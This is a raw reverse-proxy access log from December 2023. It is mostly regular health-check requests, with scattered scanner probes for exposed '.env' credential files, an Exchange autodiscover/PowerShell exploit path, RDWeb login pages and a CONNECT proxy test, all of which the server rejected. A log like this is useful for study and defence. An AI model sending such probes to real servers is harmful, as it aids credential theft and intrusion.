167.71.120.76 - - [17/Dec/2023:17:13:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1834 "www@docker" "http://172.18.0.9:80" 1ms
45.79.221.160 - - [17/Dec/2023:17:13:40 +0000] "GET /WDgZ HTTP/1.1" 301 17 "-" "-" 1835 "web-to-websecure@internal" "-" 0ms
45.79.221.160 - - [17/Dec/2023:17:13:40 +0000] "GET /n4Nm HTTP/1.1" 301 17 "-" "-" 1836 "web-to-websecure@internal" "-" 0ms
96.126.112.220 - - [17/Dec/2023:17:13:41 +0000] "GET /VDoS HTTP/1.1" 404 19 "-" "-" 1837 "-" "-" 0ms
96.126.112.220 - - [17/Dec/2023:17:13:41 +0000] "GET /Nz2c HTTP/1.1" 404 19 "-" "-" 1838 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:17:14:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1839 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:17:14:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1840 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:17:15:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1841 "www@docker" "http://172.18.0.9:80" 0ms
95.214.235.169 - - [17/Dec/2023:17:15:34 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1842 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [17/Dec/2023:17:15:35 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1843 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [17/Dec/2023:17:15:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1844 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:17:16:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1845 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:17:16:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1846 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:17:17:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1847 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:17:17:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1848 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:17:18:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1849 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:17:18:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1850 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:17:19:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1851 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:17:19:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1852 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:17:20:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1853 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:17:20:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1854 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:17:21:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1855 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:17:21:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1856 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:17:22:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1857 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:17:22:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1858 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:17:23:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1859 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:17:23:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1860 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:17:24:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1861 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:17:24:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1862 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:17:25:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1863 "www@docker" "http://172.18.0.9:80" 0ms
52.186.176.172 - - [17/Dec/2023:17:25:29 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1864 "web-to-websecure@internal" "-" 0ms
52.186.176.172 - - [17/Dec/2023:17:25:29 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 1865 "-" "-" 0ms
52.186.176.172 - - [17/Dec/2023:17:25:29 +0000] "GET /api/.env HTTP/1.1" 301 17 "-" "-" 1866 "web-to-websecure@internal" "-" 0ms
52.186.176.172 - - [17/Dec/2023:17:25:30 +0000] "GET /api/.env HTTP/1.1" 404 19 "-" "-" 1867 "-" "-" 0ms
52.186.176.172 - - [17/Dec/2023:17:25:30 +0000] "GET /laravel/.env HTTP/1.1" 301 17 "-" "-" 1868 "web-to-websecure@internal" "-" 0ms
52.186.176.172 - - [17/Dec/2023:17:25:30 +0000] "GET /laravel/.env HTTP/1.1" 404 19 "-" "-" 1869 "-" "-" 0ms
162.142.125.216 - - [17/Dec/2023:17:25:32 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1870 "web-to-websecure@internal" "-" 0ms
162.142.125.216 - - [17/Dec/2023:17:25:35 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1871 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [17/Dec/2023:17:25:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1872 "www@docker" "http://172.18.0.9:80" 0ms
162.142.125.216 - - [17/Dec/2023:17:25:38 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1873 "-" "-" 0ms
107.170.230.21 - - [17/Dec/2023:17:26:18 +0000] "GET /autodiscover/autodiscover.json?@zdi/Powershell HTTP/1.1" 404 19 "-" "-" 1874 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:17:26:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1875 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:17:26:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1876 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:17:27:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1877 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:17:27:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1878 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:17:28:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1879 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:17:28:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1880 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:17:29:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1881 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:17:29:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1882 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:17:30:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1883 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:17:30:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1884 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:17:31:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1885 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:17:31:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1886 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:17:32:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1887 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:17:32:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1888 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:17:33:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1889 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:17:33:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1890 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:17:34:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1891 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:17:34:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1892 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:17:35:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1893 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:17:35:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1894 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:17:36:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1895 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:17:36:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1896 "www@docker" "http://172.18.0.9:80" 0ms
95.214.235.169 - - [17/Dec/2023:17:36:51 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1897 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [17/Dec/2023:17:36:52 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1898 "web-to-websecure@internal" "-" 0ms
2.56.247.173 - - [17/Dec/2023:17:36:56 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1899 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:17:37:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1900 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:17:37:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1901 "www@docker" "http://172.18.0.9:80" 1ms
90.151.171.106 - - [17/Dec/2023:17:37:51 +0000] "CONNECT - HTTP/1.1" 308 18 "-" "-" 1902 "web-to-websecure@internal" "-" 0ms
90.151.171.106 - - [17/Dec/2023:17:38:02 +0000] "GET ?Z78354937572Q1 HTTP/1.1" 301 17 "-" "-" 1903 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:17:38:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1904 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:17:38:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1905 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:17:39:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1906 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:17:39:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1907 "www@docker" "http://172.18.0.9:80" 0ms
91.92.249.130 - - [17/Dec/2023:17:40:04 +0000] "GET /RDWeb/Pages/en-US/login.aspx HTTP/1.1" 404 19 "-" "-" 1908 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:17:40:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1909 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:17:40:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1910 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:17:41:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1911 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:17:41:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1912 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:17:42:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1913 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:17:42:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1914 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:17:43:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1915 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:17:43:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1916 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:17:44:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1917 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:17:44:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1918 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:17:45:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1919 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:17:45:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1920 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:17:46:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1921 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:17:46:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1922 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:17:47:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1923 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:17:47:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1924 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:17:48:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1925 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:17:48:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1926 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:17:49:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1927 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:17:49:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1928 "www@docker" "http://172.18.0.9:80" 1ms
45.79.163.53 - - [17/Dec/2023:17:50:13 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1929 "-" "-" 0ms
45.79.181.179 - - [17/Dec/2023:17:50:20 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1930 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:17:50:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1931 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:17:50:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1932 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:17:51:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1933 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:17:51:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1934 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:17:52:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1935 "www@docker" "http://172.18.0.9:80" 1ms
57.129.23.166 - - [17/Dec/2023:17:52:32 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1936 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [17/Dec/2023:17:52:32 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1937 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [17/Dec/2023:17:52:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1938 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:17:53:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1939 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:17:53:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1940 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:17:54:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1941 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:17:54:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1942 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:17:55:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1943 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:17:55:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1944 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:17:56:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1945 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:17:56:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1946 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:17:57:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1947 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:17:57:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1948 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:17:58:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1949 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:17:58:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1950 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:17:59:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1951 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:17:59:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1952 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:18:00:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1953 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:18:00:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1954 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:18:01:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1955 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:18:01:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1956 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:18:02:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1957 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:18:02:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1958 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:18:03:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1959 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:18:03:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1960 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:18:04:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1961 "www@docker" "http://172.18.0.9:80" 0ms
162.243.144.9 - - [17/Dec/2023:18:04:35 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1962 "-" "-" 0ms
167.71.120.76 - - [17/Dec/2023:18:04:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1963 "www@docker" "http://172.18.0.9:80" 1ms
91.92.249.130 - - [17/Dec/2023:18:05:17 +0000] "GET /RDWeb/Pages/en-US/login.aspx HTTP/1.1" 404 19 "-" "-" 1964 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:18:05:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1965 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:18:05:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1966 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:18:06:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1967 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:18:06:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1968 "www@docker" "http://172.18.0.9:80" 1ms
143.110.222.166 - - [17/Dec/2023:18:06:53 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1969 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:18:07:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1970 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:18:07:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1971 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:18:08:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1972 "www@docker" "http://172.18.0.9:80" 1ms
198.235.24.47 - - [17/Dec/2023:18:08:31 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1973 "web-to-websecure@internal" "-" 0ms
198.235.24.47 - - [17/Dec/2023:18:08:32 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1974 "-" "-" 0ms
167.71.120.76 - - [17/Dec/2023:18:08:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1975 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:18:09:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1976 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:18:09:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1977 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:18:10:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1978 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:18:10:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1979 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:18:11:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1980 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:18:11:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1981 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:18:12:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1982 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:18:12:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1983 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:18:13:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1984 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:18:13:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1985 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:18:14:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1986 "www@docker" "http://172.18.0.9:80" 0ms
107.170.230.33 - - [17/Dec/2023:18:14:25 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1987 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [17/Dec/2023:18:14:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1988 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:18:15:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1989 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:18:15:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1990 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:18:16:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1991 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:18:16:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1992 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:18:17:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1993 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:18:17:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1994 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:18:18:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1995 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:18:18:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1996 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:18:19:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1997 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [17/Dec/2023:18:19:33 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1998 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [17/Dec/2023:18:19:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1999 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:18:20:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2000 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:18:20:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2001 "www@docker" "http://172.18.0.9:80" 0ms
69.164.217.74 - - [17/Dec/2023:18:21:14 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2002 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:18:21:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2003 "www@docker" "http://172.18.0.9:80" 1ms
45.79.181.104 - - [17/Dec/2023:18:21:26 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2004 "-" "-" 0ms
167.71.120.76 - - [17/Dec/2023:18:21:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2005 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:18:22:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2006 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:18:22:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2007 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:18:23:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2008 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:18:23:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2009 "www@docker" "http://172.18.0.9:80" 0ms
167.248.133.122 - - [17/Dec/2023:18:24:13 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2010 "-" "-" 0ms
167.248.133.122 - - [17/Dec/2023:18:24:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2011 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:18:24:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2012 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:18:24:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2013 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:18:25:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2014 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:18:25:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2015 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:18:26:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2016 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:18:26:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2017 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:18:27:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2018 "www@docker" "http://172.18.0.9:80" 1ms
